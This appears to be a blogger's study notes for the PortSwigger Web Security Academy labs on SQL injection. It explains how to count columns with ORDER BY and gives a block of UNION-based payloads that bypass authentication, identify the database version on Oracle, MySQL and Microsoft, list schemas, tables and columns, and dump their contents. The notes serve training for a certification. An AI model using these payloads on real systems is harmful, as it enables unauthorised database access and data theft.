---
title: PortSwigger Web Security Labs
date: 2026-02-03
categories: [BSCP]
tags: [web]
description: "Note for Web Security Labs"
---

## SQL Injection
### Cheat Sheet
- Cheat Sheet can be found [here](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### Notes
To do further injection, the first thing we should check is the number of columns. We can use this query `' ORDER BY {number}`, and if we see the server is crashed, for example, when injecting `' ORDER BY 3`, it means that the database has 2 columns. Most of the labs here have 2 columns.

### Labs
- Useful resources from AI can be found [here](https://chatgpt.com/share/6984ac5e-6544-800d-84c1-02420cc47e47).
```sql
-- used to retrieve hidden data and bypass authentication
OR 1=1 -- -
-- querying the database type and version on Oracle
UNION SELECT NULL, banner FROM v$version -- -
-- querying the database type and version on MySQL and Microsoft
UNION SELECT NULL, @@version -- -
-- listing the database contents on non-Oracle databases
UNION SELECT NULL, schema_name FROM information_schema.schemata -- - list databases
UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema='dbname' -- - list tables in a database
UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='table_name' -- - list columns in a table
UNION SELECT column1, column2 FROM table_name -- - dump datas
-- listing the database contents on Oracle
UNION SELECT NULL, banner FROM v$version -- - same as show version but can skip to list tables
UNION SELECT NULL, table_name FROM all_tables -- - list tables
UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name='table_name' -- - list columns
UNION SELECT column1, column2 FROM table_name -- - dump datas
-- determining the number of columns returned by the query
UNION SELECT NULL, NULL, NULL FROM information_schema.schemata -- -
-- finding a column containing text
UNION SELECT 1, 'JqsAUV', 1 FROM information_schema.schemata -- - if give string value to a column and the server is crashed, it means that column is int
```

## Cross-site Scripting (XSS)
### Cheat Sheet
### Notes
### Labs